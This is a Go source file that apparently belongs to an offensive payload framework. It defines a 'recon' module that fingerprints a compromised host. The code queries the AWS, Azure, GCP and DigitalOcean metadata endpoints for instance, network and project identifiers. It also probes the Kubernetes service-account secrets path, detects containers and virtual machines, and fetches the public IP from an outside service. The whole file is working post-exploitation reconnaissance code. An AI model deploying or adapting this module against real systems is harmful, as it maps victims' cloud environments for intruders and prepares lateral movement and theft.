package payloads

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

func init() {
	Register(&CloudDetector{})
}

type CloudDetector struct{}

func (c *CloudDetector) Name() string     { return "cloud_detector" }
func (c *CloudDetector) Category() string { return "recon" }
func (c *CloudDetector) Description() string {
	return "Detect cloud environment (AWS/Azure/GCP/DigitalOcean/Docker/K8s)"
}

func (c *CloudDetector) Execute(args map[string]string) ([]byte, error) {
	result := c.detectAll()
	return MarshalJSON(result)
}

type cloudResult struct {
	Provider string            `json:"provider"`
	Metadata map[string]string `json:"metadata"`
	Features map[string]bool   `json:"features"`
	IsCloud  bool              `json:"is_cloud"`
	IsVM     bool              `json:"is_vm"`
	Hostname string            `json:"hostname"`
	PublicIP string            `json:"public_ip,omitempty"`
}

func (c *CloudDetector) detectAll() *cloudResult {
	r := &cloudResult{
		Metadata: make(map[string]string),
		Features: make(map[string]bool),
	}
	hostname, _ := os.Hostname()
	r.Hostname = hostname

	client := &http.Client{Timeout: 2 * time.Second}

	// AWS
	if detectAWS(client, r) {
		r.Provider = "aws"
		r.IsCloud = true
	}
	// Azure
	if detectAzure(client, r) {
		r.Provider = "azure"
		r.IsCloud = true
	}
	// GCP
	if detectGCP(client, r) {
		r.Provider = "gcp"
		r.IsCloud = true
	}
	// DigitalOcean
	if detectDO(client, r) {
		r.Provider = "digitalocean"
		r.IsCloud = true
	}
	// Docker
	if detectDocker(r) {
		r.Provider = "docker"
		r.IsCloud = true
	}
	// K8s
	if detectK8s(r) {
		r.Provider = "kubernetes"
		r.IsCloud = true
	}

	// VM detection
	detectVM(r)

	// Public IP
	if ip, err := getPublicIP(client); err == nil {
		r.PublicIP = ip
	}

	return r
}

func metadataGet(client *http.Client, url, headerKey, headerVal string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return ""
	}
	if headerKey != "" {
		req.Header.Set(headerKey, headerVal)
	}
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(data))
}

func detectAWS(client *http.Client, r *cloudResult) bool {
	// IMDSv2
	req, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	resp, err := client.Do(req)
	token := ""
	if err == nil {
		tokBytes, _ := io.ReadAll(resp.Body)
		token = strings.TrimSpace(string(tokBytes))
		resp.Body.Close()
		r.Features["aws_imdsv2"] = token != ""
	}

	// Check metadata
	metaURL := "http://169.254.169.254/latest/meta-data/"
	req, _ = http.NewRequest("GET", metaURL, nil)
	if token != "" {
		req.Header.Set("X-aws-ec2-metadata-token", token)
	}
	resp, err = client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return false
	}
	resp.Body.Close()

	fields := []struct{ key, path string }{
		{"instance-id", "instance-id"},
		{"instance-type", "instance-type"},
		{"ami-id", "ami-id"},
		{"region", "placement/availability-zone"},
		{"vpc-id", "network/interfaces/macs/0/vpc-id"},
		{"subnet-id", "network/interfaces/macs/0/subnet-id"},
	}
	for _, f := range fields {
		val := metadataGet(client, "http://169.254.169.254/latest/meta-data/"+f.path, "X-aws-ec2-metadata-token", token)
		if val != "" {
			r.Metadata["aws_"+f.key] = val
		}
	}

	return true
}

func detectAzure(client *http.Client, r *cloudResult) bool {
	data := metadataGet(client, "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata", "true")
	if data == "" {
		// Check DMI
		if checkDMI("sys_vendor", "microsoft") {
			return true
		}
		return false
	}
	r.Metadata["azure_raw"] = data
	return true
}

func detectGCP(client *http.Client, r *cloudResult) bool {
	data := metadataGet(client, "http://metadata.google.internal/computeMetadata/v1/", "Metadata-Flavor", "Google")
	if data == "" {
		if checkDMI("product_name", "google") {
			return true
		}
		return false
	}
	r.Metadata["gcp_raw"] = data

	endpoints := []struct{ endpoint, key string }{
		{"instance/id", "gcp_instance_id"},
		{"instance/machine-type", "gcp_machine_type"},
		{"instance/zone", "gcp_zone"},
		{"project/project-id", "gcp_project_id"},
	}
	baseURL := "http://metadata.google.internal/computeMetadata/v1/"
	for _, ep := range endpoints {
		val := metadataGet(client, baseURL+ep.endpoint, "Metadata-Flavor", "Google")
		if val != "" {
			r.Metadata[ep.key] = val
		}
	}
	return true
}

func detectDO(client *http.Client, r *cloudResult) bool {
	data := metadataGet(client, "http://169.254.169.254/metadata/v1.json", "", "")
	if data != "" {
		r.Metadata["digitalocean_raw"] = data
		return true
	}
	if _, err := os.Stat("/etc/digitalocean"); err == nil {
		return true
	}
	return false
}

func detectDocker(r *cloudResult) bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		r.Features["container"] = true
		return true
	}
	data, err := os.ReadFile("/proc/1/cgroup")
	if err == nil && strings.Contains(string(data), "docker") {
		r.Features["container"] = true
		return true
	}
	return false
}

func detectK8s(r *cloudResult) bool {
	if _, err := os.Stat("/var/run/secrets/kubernetes.io/serviceaccount"); err == nil {
		r.Features["container"] = true
		r.Features["orchestrated"] = true
		ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
		if err == nil {
			r.Metadata["k8s_namespace"] = strings.TrimSpace(string(ns))
		}
		return true
	}
	// Check env vars
	k8sVars := []string{"KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT"}
	for _, v := range k8sVars {
		if os.Getenv(v) != "" {
			r.Features["container"] = true
			r.Features["orchestrated"] = true
			return true
		}
	}
	return false
}

func detectVM(r *cloudResult) {
	indicators := []struct{ file, substr string }{
		{"/sys/class/dmi/id/product_name", "virtualbox"},
		{"/sys/class/dmi/id/product_name", "vmware"},
		{"/sys/class/dmi/id/product_name", "kvm"},
		{"/sys/class/dmi/id/product_name", "qemu"},
		{"/sys/class/dmi/id/product_name", "xen"},
		{"/sys/class/dmi/id/product_name", "hyper-v"},
		{"/sys/class/dmi/id/sys_vendor", "vmware"},
		{"/sys/class/dmi/id/sys_vendor", "microsoft"},
		{"/sys/class/dmi/id/bios_vendor", "xen"},
	}
	for _, ind := range indicators {
		data, err := os.ReadFile(ind.file)
		if err == nil && strings.Contains(strings.ToLower(string(data)), ind.substr) {
			r.Features["virtual_machine"] = true
			return
		}
	}
}

func checkDMI(file, vendor string) bool {
	data, err := os.ReadFile("/sys/class/dmi/id/" + file)
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(data)), vendor)
}

func getPublicIP(client *http.Client) (string, error) {
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		// Fallback to DNS
		addrs, err := net.LookupHost("myip.opendns.com")
		if err == nil && len(addrs) > 0 {
			return addrs[0], nil
		}
		return "", fmt.Errorf("no public ip")
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(data)), nil
}
